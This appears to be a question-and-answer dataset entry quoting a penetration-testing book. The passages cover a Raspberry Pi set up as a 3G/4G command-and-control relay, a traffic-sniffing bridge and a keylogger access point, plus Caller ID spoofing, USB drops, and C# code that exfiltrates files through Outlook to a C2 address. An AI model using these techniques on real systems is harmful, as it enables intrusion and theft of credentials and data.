screen\noverscan_left=20\noverscan_right=12\noverscan_top=10\noverscan_bottom=10\nAdd the following line to set the MAC address of your choice. In this case, the\nfirst three octets signify that the device was manufactured by Cisco Systems\nInc.:\nsmsc95xx.macaddr=00:11:21:3D:22:A5\nNote that it is not necessary to make any further configuration changes within\nRaspbian via ifconfig etc.\nYou can take this as far as you want, for example, by configuring a fake Cisco\ntelnet or SSH daemon.\nConfiguring Out-of-Band Command and Control Using 3G/4G\nA C2 agent can communicate with the server in one of three ways:\nUsing the target's own network infrastructure—This is not recommended,\nas egress may not be available or may be heavily restricted. Additionally,\nyou are unnecessarily exposing your traffic to whatever security policies\nand technologies are in place.\nCreating an AP using the Pi's on-board wireless chip—Again, this might\nwork in a pinch in very limited circumstances but will be a recipe for\nfrustration given the limited range and power of the device. You can add\nmore powerful wireless hardware, but this will be to the detriment of\nstealth (as would generally use a wireless access point).\nUse a 3G/4G connection to talk back to the C2 server—This is an ideal\nscenario assuming the network you're plugging into is not protected by a\nFaraday cage. This is the approach I will describe here.\nThe Pi does not support mobile connections natively but a USB 3G/4G dongle\ncan easily be added and is supported by the Raspbian OS. In the following\nexample, I use a Huawei HSPA USB stick connected to the Vodafone network.\nThe easiest way to demonstrate configuring a 3G/4G connection is with the\nsakis script run in interactive mode.\nInstall PPP:\nsudo apt-get install ppp\nDownload the Sakis3g package:\n<br>sudo wget \"http://www.sakis3g.com/downloads/sakis3g.tar.gz\" -O\nsakis3g.tar.gz\nUnzip the file:\nsudo tar -xzvf sakis3g.tar.gz\nMake the file executable:\nsudo chmod +x sakis3g\nLaunch it in interactive mode:\n./sakis3g --interactive\nThe steps shown in Figures 6-10 through 6-15 illustrate the configuration of\nthe Huawei device.\nFigure 6.10: Step one: connect with 3G.\nFigure 6.11: Step two: select a USB device.\nFigure 6.12: Step three: HUAWEI mobile.\nFigure 6.13: Step four: interface #0.\nFigure 6.14: Step five: business subscription.\nFigure 6.15: Step six: you're good to go.\nWe now have Internet access via 3G:\nppp0 Link encap:Point-to-Point Protocol\ninet addr:109.32.107.215 P-t-P:10.64.64.64\nMask:255.255.255.255\nUP POINTOPOINT RUNNING NOARP MULTICAST MTU:1500 Metric:1\nRX packets:12 errors:0 dropped:0 overruns:0 frame:0\nTX packets:21 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:3\nRX bytes:582 (582.0 B) TX bytes:4792 (4.6 KiB)\nCreating a Transparent Bridge\nConnecting the Pi directly to the switch permits attacks against adjacent\nsystems and possibly wider access depending on how the network is\narchitected. However, options to intercept data are limited. Perhaps if the\nswitch itself could be compromised, a TAP port could be created, but the\namount of data the Pi would have to handle makes this approach unrealistic\nat best. Another potential way to intercept traffic is ARP cache poisoning, but\nthis is far too clumsy and modern networks can easily detect and foil it.\nThere is a better way.\nIf another Ethernet adapter is added to the Pi (a USB adapter is the best way\nto go), you can turn the Pi into a transparent, completely protocol-agnostic\nbridge that can be introduced inline into a network connection between either\na switch and a host or a switch and router in whatever configuration you\nwant.\nCombine this with PoE and you have a self-powered network tap that will\nroute data between two points and (using whatever tools you favor) log\ntraffic, passwords, and so forth. This won't allow visibility into encrypted\ntraffic, but you'd be amazed at how much interesting stuff goes over the\nnetwork in plaintext. In the DMZ, this can be used to capture emails, for\nexample. Configuring the Pi to do this is simpler than you might think. First\ninstall the bridge tools:\nsudo apt-get install bridge-utils\nThen modify the configuration /etc/network/interfaces file to append the\nfollowing:\nauto br0\niface br0 inet dhcp\nbridge_ports eth0 eth1\nbridge_stp on\nNote that this example assumes your built-in NIC is eth0 and the USB adapter\nis eth1, but that should be the case. The last step is to bring up the bridge\ninterface:\nsudo ifconfig up br0\nYou're good to go.\nUsing a Pi as a Wireless AP to Provision Access by Remote\nKeyloggers\nHardware keyloggers are devices that are physically connected between the\nhost and the keyboard (see Figure 6.16). There are advantages of using this\napproach over a software keylogger. They are immune to antivirus and will\ncapture everything the user types without needing any special privileges or\nprocess access. The disadvantages are expense—hardware keyloggers are\navailable that can connect to a WiFi AP and talk home but they cost a couple\nhundred dollars. You also must be physically present to install them, rather\nthan remotely delivering a software payload. That being said, given that the Pi\nhas wireless on board and it is possible to configure a 3G/4G C2 channel, if\nyou do have physical access for a short time, a Pi could be deployed\nsomewhere discreetly in the building and then serve as an AP that keyloggers\ncould connect to and send data home.\nFigure 6.16: The KeyGrabber is an example of a WiFi-capable keylogger.\nA Raspberry Pi can be turned into a discreet wireless access point by using the\nfollowing steps.\nInstall the required software:\nsudo apt-get install hostapd isc-dhcp-server\nEdit the DHCP server's configuration file:\nsudo nano /etc/dhcp/dhcpd.conf\nTo reflect the following:\nauthoritative;\nsubnet 192.168.69.0 netmask 255.255.255.0 {\nrange 192.168.69.10 192.168.69.50;\noption broadcast-address 192.168.69.255;\noption routers 192.168.69.1;\ndefault-lease-time 600;\nmax-lease-time 7200;\n}\nThen modify the network interfaces config:\nsudo nano /etc/network/interfaces\nTo give it a static IP:\niface wlan0 inet static\naddress 192.168.69.1\nnetmask 255.255.255.0\nConfigure the AP:\nsudo nano /etc/hostapd/hostapd.conf\nTo reflect the following:\ninterface=wlan0\nssid=AP4passwordtheft\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=supersecretpassword\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\nYou might want to change the SSID and passphrase.\nFinish off the DHCP configuration:\nsudo nano /etc/default/hostapd\nAdd this line:\nDAEMON_CONF=\"/etc/hostapd/hostapd.conf\"\nConfigure Network Address Translation (NAT):\nsudo nano /etc/sysctl.conf\nAdd the following line:\nnet.ipv4.ip_forward=1\nActivate IP forwarding with the following command:\nsudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\"\nA quick addition of some IPTables rules is necessary to ensure that traffic is\nrouted over the 3G/4G C2 channel:\nsudo iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE\nsudo iptables -A FORWARD -i ppp0 -o wlan0 -m state --state\nRELATED,ESTABLISHED -j ACCEPT\nsudo iptables -A FORWARD -i wlan0 -o ppp0 -j ACCEPT\nMake these rules persistent to survive reboots:\nsudo sh -c \"iptables-save > /etc/iptables.ipv4.nat\"\nEdit the interfaces file again:\nsudo nano /etc/network/interfaces\nAdd the following line:\nup iptables-restore < /etc/iptables.ipv4.nat\nStart the AP with the following command:\nsudo /usr/sbin/hostapd /etc/hostapd/hostapd.conf\nAs long as your 3G/4G C2 is correctly configured, clients can now connect to\nthis AP and access the Internet. More specifically, hardware keyloggers can\nconnect to the AP and deliver logged keystrokes.\nThe Attack\nMisrepresenting oneself is at the core of a successful APT, whether modeled\nor otherwise. The easiest and safest way to do this is by telephone.\nTelephones are a technology that people trust (at least more than email)\nbecause they believe they are infallible. Telephone technologies such as Caller\nID and SMS can be easily compromised to make the receiver believe they are\nreceiving a call or a text from whomever the attacker wants. This way,\ninstructions (or demands) can be made of a target in a convincing manner.\nThe importance of acquiring company telephony directories should now be\nclear. Such an attack can be combined with a mass mail to determine who has\nan “Out of Office” vacation message set on their email account. Therefore,\nwhen (for example) a spoofed SMS message is sent, there is a minimal chance\nof the actual owner of that number seeing any replies that might be sent by\nSMS or email.\nSpoofing Caller ID and SMS Messages\nIn this instance, I was able to swipe an internal directory from reception but\nthat's not always needed—reception staff will often provide you with mobile\nnumbers for staff if you already have names to work with. Spoofing the phone\nnumbers can be done in various ways—if this is something you're going to\nwant to do a lot, I suggest you build your own Asterisk PBX, but that is\nabsolutely not required. There are various VoIP vendors that allow outbound\ncalling globally for low rates and—critically—the option to set your own Caller\nID and SMS number. Once you have configured your software to use the VoIP\nprovider, configuration of the latter is shown in Figures 6.17 and 6.18.\nFigure 6.17: Caller ID can be easily spoofed.\nFigure 6.18: Spoofing SMS messages likewise.\nGiven time constraints and the unusual circumstances we were under and\nalso due to the fact that we had (at least theoretically) physical access, I\ndecided that we needed a quick win. This would be as follows:\nDeploy physical keyloggers with the intent of gaining administrative\naccess.\nDeploy a Raspberry Pi to act as a wireless hub to deliver logger key data\nback to base using a 3G data connection.\nDemonstrate that we could cause some action to be carried out by the\ntarget using spoofed SMS messages or Caller ID.\nThese goals, executed within a short time frame, would certainly demonstrate\nvulnerability and would give sufficient additional access should the client\nwant to see the effects of a longer-term APT scenario executed from this\njumping-off point. We would then attempt to access the confidential data\ndescribed at the beginning of this chapter.\nThe Raspberry Pi didn't need access to the network to do its job, only power\nand a discreet location. I slapped a label on the side in case anyone found it, as\nshown in Figure 6.19.\nFigure 6.19: Keep these things simple but use whatever templates you have\nat hand.\nInstalling the preconfigured hardware keyloggers is as simple as waiting until\nlunch and connecting them inline between the keyboard and computer towers\nunder the desk; they won't go undiscovered forever, but then they don't need\nto—just long enough to grab some admin credentials or other juicy data that\nwould be transmitted back to base via the DIY Raspberry Pi/wireless access\npoint/3G/4G solution.\nAs it turned out, we were only able to gain non-administrative accounts\nthrough the keylogging attack so we used a forged caller ID attack from a\nlegitimate user to an admin to ask them to log on to that user's workstation to\ncheck out a problem and then stole the domain admin token when they did\nso.\nMany corporate environments have a standard phone image that is copied to a\nmobile before it is issued to a member of staff. This image contains not only\nthe security policy but also the latest phone book. The benefit of this from our\nperspective is that a forged number will show up as the equivalent name in\nthe phone book. Again, this gives the target no reason to be suspicious\nwhatsoever. This is one of the simplest but most powerful attacks in your\narsenal.\nIn any event, it transpired that every workstation and server on the network\nwas being administered by VNC (which is often deployed secured with a\nsingle password across the entire enterprise). This meant that once a single\nworkstation had been compromised, the password could be easily recovered\nfrom the Registry as it is only stored with the simplest of encoding. At this\npoint, with a VNC client, we could access every system on the network. The\nbiggest problem we had was copying large quantities of confidential data in\nthe time we had left.\nSummary\nThis chapter introduced new technologies and concepts demonstrating the\nbenefit of even short-term physical access to a target's location. Never assume\nthat a target organization's security posture is commensurate with the\nsecurity of the data they are trying to protect. A police service is a public body\nand as such does not have the security budget of a bank or a large corporation.\nA black hat could have sold the data we obtained to organized crime for a\npretty penny. Even the location and nature of all the firearms in the county\nwould have been gold, let alone details concerning informants.\nExercises\n1. You've seen how to use a Raspberry Pi to sniff traffic and be part of a\nkeylogging solution. Take this one step further and consider how it may be\npossible to use a Pi as both a hardware keylogger and a C2 agent and how\nthis might be achieved discreetly.\n2. Create an HTML application with a specific target organization in mind.\nConsider branding and logos.\n3. Given how DLLs were attacked in this chapter in order to escalate\nprivileges, could you use a similar technique to attack services?",
    "question": "What is the practical lesson learned from the anecdote about the police service and the security consultant's experience?",
    "summary": "This chapter discusses techniques for gaining and maintaining access to a target system, including using VBScript with HTA to deliver payloads, exploiting vulnerabilities in software and configurations, and using DLL hijacking to escalate privileges. It also covers methods for creating a stealthy hardware backdoor, such as a Raspberry Pi configured as a 3G/4G C2 agent or a wireless access point, and using it to intercept data or act as a bridge in a network. The text highlights the importance of understanding how to exploit weaknesses in systems, even with limited access, and emphasizes the need for careful planning and execution to avoid detection."
  },
  {
    "start": 48,
    "end": 52,
    "text": "Chapter 7\nWar Games\nA few years ago, a bank asked me to carry out a number of tests against one of\ntheir HQs in the Netherlands. This was something they did every year and\nconsisted of a slew of tests: build reviews, internal infrastructure, and web\napplication testing—nothing terribly interesting. One test they wanted\nperform was data exfiltration testing, that is, determine how easy it is for a\nuser to get critical data out of the building once it had been obtained. In this\nparticular scenario, it was very easy because every user had web-to-desktop,\nemail, working USB drives, access to internal email, and so on, but it got me\nthinking about scenarios that would be deployed in many later, more relevant\ntests. The major takeaway from this is that it is worthwhile to conduct\nexfiltration testing only in a genuinely secure environment where your users\nare subject to a limited degree of trust. That is what this chapter is all about.\nSIPRNET AND THE DIPLOMATIC CABLES SCANDAL\nAfter 9/11 a lot of questions were asked and a lot of fingers were pointed,\nparticularly at intelligence agencies for not foiling the attacks despite the\nfact that it was known that Al-Qaeda was planning to attack the United\nStates with airliners. A major problem that was identified was a lack of\nintelligence sharing between different branches of law enforcement, the\nmilitary, and intelligence-gathering organizations.\nPart of the solution to this problem was the development of a secure\ncomputer network called SIPRNet (or Secret Internet Protocol Router\nNetwork). SIPRNet was created to handle data up to and including\nSECRET while other systems were used for handling TOP SECRET data.\nSIPRNet was designed so that classified information could be easily and\n(theoretically securely) shared between the Department of Defense and\nthe Department of State.\nBy 2010 SIPRNet had many more users, as access had been extended to\nallies in the so-called Five-Eyes program (the UK, Canada, Australia, and\nNew Zealand). One of those users was a junior intelligence analyst named\nBradley Manning who, through his access, leaked huge swaths of data to\nWikiLeaks.\nThis was all in the news of course but the takeaway here is that Manning\nexfiltrated the data on CD-ROMs disguised as Lady Gaga CDs. There was\nvirtually no host lockdown on the SIPRNet terminals themselves as they\nwere not connected to other networks and considered secure. According to\nManning, analysts regularly listened to music on SIPRNet terminals so\nthis was not suspicious.\nAnother important point is that a SIPRNet terminal could run Windows,\nwhereas terminals connected to NSANET or JWICS were typically Sun\nworkstations.\nBackground and Mission Briefing\nThe target in this particular misadventure was a military computer network in\nthe UK. This network had no Internet connectivity and was segregated\nphysically from other computer infrastructure in the building. There were a\nlimited number of terminals and these could only be accessed by an officer\nwith both security credentials and a smartcard.\nTricky.\nGetting access to the network was one problem, liberating the data was\nsomething else entirely. There was no way that I was prepared to conduct a\nphysical penetration test against an army base (the amusing anecdote below\nspells out why, in no uncertain terms) and there was no way we could hack\nsecure military infrastructure from the Internet. There may have been some\nother access ports somewhere or some other kind of adjacent network\nconnectivity, but nothing we were going to get access to in any measurable\nkind of time frame, and we certainly didn't have any kind of network\nspecifications to work with. See Figure 7.1.\nFigure 7.1: Compartmented U.S. secure communications center.\nThe attack would have to use some sort of physical component to deliver the\npayload. A CD, maybe? Not nearly imaginative enough. Even if the target\ncould be persuaded to insert the disk into a computer, it would need to be the\nright computer, and then there was still the problem of exfiltrating the data.\nIn “The Attack” section later in this chapter, I detail exactly how these\nproblems were overcome; however, first things first. I want to discuss the\nideas and techniques that were discussed as potential vectors for both payload\ndeployment and C2 when planning the mission. While most of these ideas\nwere dismissed for this particular operation, the exercise was extremely\ninformative for future such engagements and makes for valuable study.\nMY FIRST (AND VERY NEARLY LAST) PHYSICAL\nPENETRATION TEST\nYou should have noted by now that I love my little anecdotes, but they\nalways come with a lesson. I've had a gun pointed at me precisely twice in\nmy life. The first time was in 1999 in the Netherlands—a\nmisunderstanding by the police after my girlfriend lent my car to one of\nher felon friends while I was on vacation. That wasn't terribly scary as the\nDutch police have limited training in firearms: “This is the end that\nshoots the bullets, avoid the trigger in case you accidentally shoot\nsomeone and…well probably best to just not load the thing.”\nThe second time was nothing short of terrifying. I'd volunteered to\nperform a physical pen test of an RAF base in England less than two\nmonths after 9/11. My “plan” consisted of climbing over a fence and\nhoping no one saw me. Minutes later I was looking down the business\nend of an L85 assault rifle carried by someone who looked about 14 years\nold and who was shaking in fear. That was scary. I found myself saying\nthings like, “Sure. Absolutely, no problem. Whatever you want.”\nMy point is that I should never have been there and there were much\nbetter ways this mission could have been executed with just a little\nthought and imagination. But most importantly, it didn't accurately\nmirror a real-world attack and was a waste of everyone's time.\nPayload Delivery Part VII: USB Shotgun Attack\nWhat if, as in the previous example, you have no reasonable expectation to\ndeliver a payload by traditional means? The environment is high security and\nthere is no secondary means of entry or compromise you can exploit (see\nChapter 8, the section “Advanced Concepts in Social Engineering”). Curiosity\nkilled the cat, and although no cats were harmed in the writing of this book,\nthere is a reason this saying is a cliché.\nTHE MADISON GURKHA STUDY\nIn 2009, a Dutch security company carried out a study to determine how\nvulnerable organizations would be to this style of attack. They did this by\nloading USB drives with a harmless payload and leaving them in various\nplaces, public or otherwise, usually in close proximity to high-value\ntargets. If someone plugged the drive into a computer with Internet\naccess, the payload would call home, noting IP addresses and so forth so\nthat the organization could be identified. The study found that major\nbanks, political parties, a foreign embassy, and others had done so. Had\nthe payload been live, the security ramifications are obvious.\nUSB Media\nOnce upon a time, the Windows AutoPlay functionality would, by default,\nexecute anything you put into an optical disk drive based on the software\ndeveloper's design. Needless to say, this posed something of a security\nvulnerability in and of itself. There were also ways to convince Windows that\na USB drive was an optical drive and use a similar strategy to execute malware\non a victim's computer. Starting with Windows 7, the OS no longer supports\nthe AutoRun functionality for non-optical removable media. AutoPlay will\nstill work on CDs and DVDs (the user will be given the option to execute the\ncode, but it won't happen automatically); however, it will no longer work at all\nfor USB drives, theoretically making social engineering attacks far harder.\nAn Effective Approach to USB Attack Vectors\nDoes this concern us? Not one bit. As I previously discussed in the VBA/VBS\nattacks in Chapter 2, I dislike the use of automated routines to get code\nexecution—it is inherently suspicious. Your social engineering attack should\nbe sufficiently elegant and engaging to convince the victim to click on\nwhatever you want them to. Remember, whatever code and attack vector you\nchoose to deploy via a USB attack, it's not being delivered by an email client or\na web browser or any other obvious route of attack—it is trusted as the target\nhas plugged the device into their workstation of their own free will.\nThis is an excellent example of how an HTML application attack (discussed in\nthe previous example) can be used to great effect. Additionally, the Windows\nScripting Host or PowerShell make for excellent attack vectors, or you could\nuse a signed Java applet if you're not sure which platform you're going to\nencounter (or if you're expecting multiple platforms and want to reliably hit\neverything you encounter). Don't forget that old favorite—the Microsoft\nOffice Macro.\nAlternatively, you may want to deploy more than one of these attacks on the\nsame media. This is not a one-shot delivery problem that you generally\nencounter when attacking through other vectors. However, as ever, be\nmindful of antivirus. How to get the USB disks into your target's computer,\nthough? In the words of Han Solo, “Well, that's the real trick, isn't it?”\nAttacking Organizations Using USB Payloads: The “Reverse Trojan\nApproach”\nExploiting a target using a USB payload approach requires solving a\nsignificant problem aside from the technical details—that is getting the\npayload into the hands of the target in a manner that is not suspicious and\nhaving them execute it. Recovering data is a separate problem and will be\ncovered in depth in the next section.\nIn cases where you need to attack lower security facilities, thumb drives can\nbe left in places where a target may reasonably expect to find them and then\nconclude that they have been accidentally misplaced, such as:\nReception areas\nElevators\nCar parks\nSpots where smokers gather (These are excellent places to leave USB\ndrives, as people often put down what they're carrying to grab their\nsmokes.)\nA little effort goes a long way. USB keys, like VPN tags, are often worn on an\nemployee's ID lanyard. Being able to emulate the corporate look and feel of\nthe thing goes a long way.\nA Little Social Engineering\nRemember way back in Chapter 1 when I talked about influencing user's\nemotions to get them to open attachments? Same deal. If the USB drive or\nindeed whatever media you choose to use appears to contain confidential\ninformation that may benefit the viewer (or may, through failing to view it,\nharm the user), you have the most powerful social engineering attack\npossible. Marking items as confidential or otherwise restricted is a good way\nto go. The worst-case scenario if an employee picks it up is that it will be\nhanded in to security or reception, who will certainly want to view the\ncontents to see who to punish for their egregious failure to follow the\norganization's security policy.\nCommand and Control Part VII: Advanced Autonomous\nData Exfiltration\nThere will be times during missions when you need to attack high-security\nenvironments where traditional means of established Command and Control\nwill be neither appropriate nor viable. I mean the use of some form of discrete\ninteractive session management or backdoor. As described in the payload\ndelivery section, it is sometimes not possible to deploy attack packages via\ntraditional means. Recovering data once a payload has been delivered can be\neven more challenging. However, even though a target network may be locked\ndown to an intimidating degree, there will always be points of egress. Your job\nas an attacker in these circumstances is twofold:\nBuild a payload with a highly specific mission to execute. As discussed,\nthis is not about establishing C2 infrastructure but hunting for specific\ntypes of files or grabbing keystrokes or gathering intelligence on target\npersonnel and so forth.\nProvide the payload with sufficient autonomy and intelligence to be able to\ndetermine a viable means of data exfiltration without the need for C2\ninfrastructure to guide it.\nWhat We Mean When We Talk About “Autonomy”\nThis is where things can get a little tricky. In order for your payload to be\nautonomous, it needs to be able to make its own decisions regarding stealth,\nrecon, and egress, all without human guidance. Obviously, the more recon\nyou can do yourself prior to the mission, the less the payload will be required\nto do itself, but in this instance we will assume that no prior research into the\ninner workings of the network is possible prior to initial deployment.\nIf you know nothing about the inner workings of a target network, but you\nknow there's no Internet access in or out and the site is physically secure\n(we're not getting in without a high probably of being shot), then it's totally\nsecure, right? Right? If you've read this far, I'm assuming you're laughing out\nloud right now (or at least enjoying a quiet giggle). At the risk of repeating\nmyself, nothing is secure.\nMeans of Egress\nIdeally, your target would have web-to-desktop, either directly or via a proxy\nserver of some kind, which obviously would make egress of any kind trivial.\nThat has been adequately covered in previous chapters. In this section, I want\nto explore less obvious methods and I have no intention of making things\neasy on myself.\nPhysical Media\nIn a scenario where a system has no connection to the outside world, it is\nworth creating a payload that can detect if removable media (such as thumb\ndrives) are connected to the system. In such an instance, target data to\nexfiltrate can be packaged on to the drive (for example, as an encrypted ZIP\nfile or equivalent) and embedded into some pseudo-executable format (such\nas the previously discussed HTML application or even a macro-carrying Office\ndocument). The reasoning here is that the device, by its nature, is mobile, so it\nmay in the future be connected to a network (such as a home WiFi setup) that\nwill have much less restricted codes of connection. It should be pointed out\nthat the number of positive variables necessary for this attack to be successful\nmakes it something of a “Hail Mary.”\nThere are, however, more advanced techniques that can work in specific cases.\nOne particular attack that was demonstrated at Black Hat in Las Vegas in 2014\n(presented by Karsten Nohl and Jakob Lell) involves a USB stick that acts as\nthree separate devices—two thumb drives and a keyboard. When the device is\nfirst plugged into a computer and is detected by the OS, it acts as a regular\nstorage device. However, when the computer is restarted and the device\ndetects that it's talking to the BIOS, it switches on the hidden storage device\nand emulates the keyboard.\nActing as a keyboard, the device sends the necessary button presses to bring\nup the boot menu and boots a minimal Linux system from the hidden thumb\ndrive. The Linux system then infects the bootloader of the computer's hard\ndisk drive, essentially acting like a boot virus.\nThis is next-generation stuff and I don't have space to discuss it in detail here,\nbut you can certainly expect to see more attacks of this nature in the future.\nLocating points of network egress is an art (and indeed a consultancy\nexercise) in its own right.\nDropbox\nI'm a total hypocrite when it comes to Dropbox (and related technologies), as\nI find it incredibly useful to sync documents over different devices and it's a\ngreat way of sharing documents, either through Dropbox accounts or via\nHTTP links with those not in possession of an account. Because Dropbox\nitself does no malware scanning, it can be a dangerous technology to allow in\nthe workplace. At a minimum, I always advise my clients to monitor it via\nNIDS or block it altogether. To make a quick analogy, when sharing this\nmanuscript with my publisher, it would get blocked by Wiley's border security\nsimply because the AV scanner was seeing certain strings in the document.\nThis was solved by putting the docs on Dropbox and sharing an HTTP link. So\nfrom our perspective, Dropbox can be used as a means of deploying payloads\nand punching straight through an organization's border security. It can be\nuseful as a means of data exfiltration. The technology uses HTTP and HTTPS\nto carry data so as long as the user has basic visibility of the web. Adding code\nto exfiltrate to your C2 is going to be trivial, particularly as there are third-\nparty libraries to do exactly that for a number of different languages:\nhttps://www.dropbox.com/developers-v1/core/sdks/other\nEmail\nIn a pinch, you can use your target's own internal email servers as a means of\nexfiltrating data, although it is not a path I would necessarily recommend.\nThis is simply because the mail server is a focal point for threat detection, be\nit spam, phishing attacks, attachment blocking, virus scanning, or whatever.\nAs a consequence, there is very mature technology watching what comes in or\ngoes out of the network via the mail server. However, it is possible to have\nyour C2 agent detect the internal address of the target's mail delivery server\nand attempt to send attachments out via SMTP (or whatever protocols are in\nuse).\nA much better approach is to detect which mail client the target is using and\nuse that technology's API as a means of egress. Obviously, this will be\ndifferent for each client, so refer to the relevant documentation. For Microsoft\nOutlook (which you will encounter in most cases), it is trivial. The following\ncode will do exactly that. For clarity (and the fun of making sure that every\ntechnology we're abusing here is Microsoft's own), it's written in C#:\nMicrosoft.Office.Interop.Outlook.Application c2App =\nnew Microsoft.Office.Interop.Outlook.Application();\nMicrosoft.Office.Interop.Outlook.MailItem c2Mail =\n(MailItem)c2App.CreateItem(OlItemType.c2MailItem);\nc2Mail.To = \"c2user@c2domain.com\";\nc2Mail.CC = \"\";\nc2Mail.Subject = \"C2 content\";\nc2Mail.Body = \"C2 Body\";\nc2Mail.Attachments.Add(AssignNoteFilePath,\nMicrosoft.Office.Interop.Outlook.OlAttachmentType.olByValue, 1,\n\"C2attachment.txt\");\nc2Mail.Send();\nIt is not possible to set an email from variable using the Outlook API\n(regardless of language), so the email will be sent using the target's account\nand that's fine. The email will not be saved in their sent items, as this requires\na specific API call, in this case c2Mail.Save(), but again that's just fine from\nour perspective.\nUsing a Laptop Workstation as a Wireless AP\nIn networks where the administrators understand information security,\nenforced policy will not permit both the Ethernet NIC and the wireless NIC to\nbe active at the same time, even if no wireless APs are detected. This approach\nprevents certain multi-layer attacks, but a C2 agent can usually enable\nwireless NIC, providing it has sufficient local privileges. The goal here is\ntwofold:\nConnect the laptop via wireless to an AP that you control. This is\nproblematic if the target is currently depending on a different AP for\nnetwork access. A timed attack where the AP is switched over to one you\ncontrol at a moment in time where the user is less likely to be using the\nlaptop is possibility. However, given that a laptop is likely to be removed\nfrom the target network outside of office hours means your window would\nbe small—a lunch break perhaps.\nThere is a better way. There is a hidden feature in Windows that allows\nyou to host your own AP while being simultaneously connected to another\none with the same adapter. The Internet Connection Sharing functionality\npermits you to then route traffic from one network to another (be it\nbetween wireless, Ethernet, or even a Bluetooth PAN). I don't know which\nrocket scientist at Microsoft thought that this would be a good idea, but we\nthank you. Setting this up is trivial. From the command line:\nc> netsh wlan set hostednetwork mode =\"allow\" ssid=\"C2backdoor\" key =\n\"password\"\nTo enable ICS:\nnet start SharedAccess\nYour mileage may vary depending on the version of Windows in use, but if\nyou're within wireless distance of the AP, this can make for a good short-term\nsolution.\nMobile Data/Bluetooth\nProtecting a site (or a small area of a site) against attackers using mobile data\nis (in theory at least) trivial. A room can be secured with a Faraday cage,\nensuring that no radio signals can enter or leave but the down side to that is\nno radio signals can enter or leave, including Tetra or other site-wide\ncommunications, which additionally prohibits the use of mobile phones in\ngeneral.\nIn some countries, it is legal to use mobile blockers to disrupt cell phone\ncommunications over the site area, but again blocking the carriers from data\ntransmission will cause most businesses a grave inconvenience. Some high-\nsecurity sites will simply prevent cell phones by policy and leave it at that,\nwhich works as well as one might expect. Some years ago I was giving a\nlecture at GCHQ and one of the staffers had a little device that would light up\nif it detected a cell signal. When it did, he stood up and mockingly scolded the\nroom and reminded attendees they were supposed to leave mobiles at\nreception.\nBefore treating us all to a huge wink.\nEveryone laughed except the “Cousins” (the informal term within British\nIntelligence for their US counterparts), but they tend to take information\nsecurity a bit more seriously.\nIn any event, such a policy will not prevent the use of 3G/4G as a means of\ndata exfiltration, which is why I discuss it in detail in the next section.\nSMS\nIf you have been able to deploy a payload that has obtained a mobile cell\nsignal, you have another means of sending data. The benefits of SMS are\nsmall but worth mentioning—a decent C2 is going to require a 3G/4G signal\nand that's not always reliably available. However, SMS will work fine if you\nonly have GPRS.\nThe maximum message length for an SMS message is 918 characters (any\nmessage that is over 160 characters will be broken down into smaller chunks\nand sent to the recipient individually), so this is not going to be terribly useful\nfor large quantities of data unless you're prepared to write some code to break\ndocuments into small chunks and then reassemble them. Realistically\nthough, this is more useful for the smaller items you'll want to snatch, such\nas password files. I spoke earlier about transactional email and how it could\nbe useful when deploying a large numbers of payloads via email. In the next\nchapter, we'll look at transactional SMS and its benefits in APT modeling.\nWe'll also examine some undocumented functionality in the SMS protocol\nand how that can be useful in command and control.\nMAIL SPOOFING SIDEBAR\nOnce upon a happy time, the only mail protocols in use were POP3 and\nSMTP. Neither provided any encryption and spoofing mail was as simple\nas connecting to the target's inbound SMTP server via telnet or netcat and\ntelling the thing you were anyone you wanted to be. In many cases, you\ncan still do that but there are technologies available to prevent it. The\nmost common is called Sender Policy Framework (SPF). SPF is a simple\nmail validation system that can detect spoofed emails by checking that\nincoming mail from any given domain is being sent by a host that's\nauthorized by that domain (assuming that a receiving host supports SPF\nlookups of course). This is implemented in the form of a DNS TXT record\n(which, as we saw earlier, can store any arbitrary value the domain\nadministrator wants). This TXT record stores the authorized hostnames\nfor that domain. For example, if we look at paypal.com's TXT records, we\nsee the following:\n$ dig +short paypal.com TXT\n\"yandex-verification: 73acb90f6a9abd76\"\n\"MS=ms95960309\"\n\"v=spf1\ninclude:pp._spf.paypal.com\ninclude:3ph1._spf.paypal.com\ninclude:3ph2._spf.paypal.com\ninclude:3ph3._spf.paypal.com\ninclude:3ph4._spf.paypal.com\ninclude:c._spf.ebay.com ~all\"\n\"google-site-\nverification=cWgMibJls3loUnoXRY4FHkeO3xGvDA4i8wnrQnolBxs\nAny mails claiming to be from PayPal (and we've all seen them) that do\nnot originate from the hosts listed here will fail the SPF test and will\nlikely be thrown straight into the spam folder if not just deleted. It doesn't\nmatter how convincing the pretext is, it's not going to work.\nThe takeaway here is that you should always check if a domain has SPF\nprotection before attempting to spoof it.\nThe Attack\nIn an episode of The West Wing, Press Secretary C.J. Cregg (played by the\ninimitable Allison Janney) has her workstation hacked by a stalker and says\nto a colleague, “Did you know that the White House network isn't even\nsecure?”\nWas that accurate? Sort of.\nWhen we talk about “secure” in the context of government or military\nnetworks, the word has a very specific meaning. It doesn't mean that extreme\nmeasures haven't gone in to securing it, but simply that if a network is\nconnected to the Internet, it is by its nature “insecure.” You should have a\nlimited expectation of security and the infrastructure is not rated for classified\nor protectively marked data.\nI'm not mentioning any names, but if I were the Secretary of State I'd want\nmy own email server too.\nIf infrastructure has to handle classified data, it has to conform to certain\nstandards. These networks are segregated from whatever your staff is using to\nbrowse the web, play solitaire, and generally waste taxpayer money. I briefly\ntalked about SIPRNet and that's what I'm going to return to now.\nThe following text is quoted from the US Defense Human Resources\nwebsite:\nThe Secret Internet Protocol Router Network (SIPRNet) is the\nDepartment of Defense network for the exchange of classified\ninformation and messages at the SECRET level. It supports the Global\nCommand and Control System, the Defense Message System, and\nnumerous other classified warfighting and planning applications.\nAlthough the SIPRNet uses the same communications procedures as the\nInternet, it has dedicated and encrypted lines that are separate from all\nother communications systems. It is the classified counterpart of the\nUnclassified but Sensitive Internet Protocol Router Network (NIPRNet),\nwhich provides seamless interoperability for unclassified combat support\napplications and controlled access to the Internet.\nAccess to the SIPRNet requires a SECRET level clearance or higher and a\nneed to have information that is available only on the SIPRNet. Because\nthe SIPRNet is an obvious target for hostile penetration, a number of\nstrict security procedures are applied. Appropriate credentials and two-\nfactor authentication are required. When using the SIPRNet, you must\nnot leave the workstation 